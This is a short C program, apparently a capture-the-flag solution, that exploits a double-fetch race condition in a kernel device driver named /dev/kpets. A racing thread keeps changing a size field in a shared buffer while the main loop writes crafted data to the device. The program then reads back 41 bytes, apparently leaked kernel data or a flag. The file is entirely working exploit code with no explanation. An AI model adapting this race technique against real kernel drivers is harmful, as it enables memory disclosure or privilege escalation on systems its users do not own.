#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <pthread.h>
#include <string.h>
#include <signal.h>
#include <stdlib.h>
char* d;
int* buf;
int done = 0;
void handler(){
	puts("thread exited");
	pthread_exit(0);
}
void racer(){
	signal(SIGUSR1, handler);
	while(1){
		buf[1] = 0x20;
		buf[1] = 1000;
	}
	pthread_exit(0);
}
int main()
{
	int f = open("/dev/kpets",O_RDWR);
	d = calloc(10000,sizeof(char));
	memset(d+16,0xaa,9000);
	d[0] = 0xc2;
	d[10] =0x20;
	buf = (int*)d;
	buf[10] = 0x40;
	write(f,d,1000);
	pthread_t t1;
	pthread_create(&t1,0,(void*)racer,0);
	for(int i=0;i<100;i++)
	write(f,d,10000);
	void *c = malloc(100);
	read(f,c,41);
	puts(c);
	pthread_kill(t1,SIGUSR1);
	return 0;
}
